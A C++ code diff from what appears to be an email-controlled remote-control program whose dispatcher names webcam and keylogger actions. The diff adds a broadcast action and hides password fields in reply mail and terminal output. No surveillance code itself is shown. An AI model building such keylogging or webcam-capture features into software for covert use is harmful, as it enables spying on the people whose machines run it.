@@ -28,6 +28,8 @@ Action getAction(string name) {
         return ACTION_WEBCAM;
     } else if (startsWith(name, "keylog")) {
         return ACTION_KEYLOG;
+    } else if (startsWith(name, "broadcast")) {
+        return ACTION_BROADCAST;
     } 
     return ACTION_INVALID;
 }
@@ -113,6 +115,9 @@ void Request::toMailString(string &subject, string &body) const {
     body = "";
     
     for (const pair<string, string>& pr : params) {
+        if (pr.first == kPassWord){
+            continue; // Chặn trường Password được gửi lại
+        }
         body += pr.first;
         body += ": ";
         body += pr.second;
@@ -186,6 +191,9 @@ void Response::deleteFiles() {
 ostream& operator<<(ostream &os, Request &o) {
     os << "Action " << o.getAction() << "\n";
     for (const pair<string, string>& pr : o.getParams()) {
+        if (pr.first == kPassWord){
+            continue; // Mail phản hồi cấm cho xuất hiện mật khẩu trên terminal
+        }
         os << pr.first << " " << pr.second << "\n";
     }
     return os;
@@ -194,6 +202,9 @@ ostream& operator<<(ostream &os, Request &o) {
 ostream& operator<<(ostream &os, Response &o) {
     os << "Action " << o.getAction() << "\n";
     for (const pair<string, string>& pr : o.getParams()) {
+        if (pr.first == kPassWord){
+            continue; // Mail phản hồi cấm cho xuất hiện mật khẩu trên terminal
+        }
         os << pr.first << " " << pr.second << "\n";
     }
     return os;
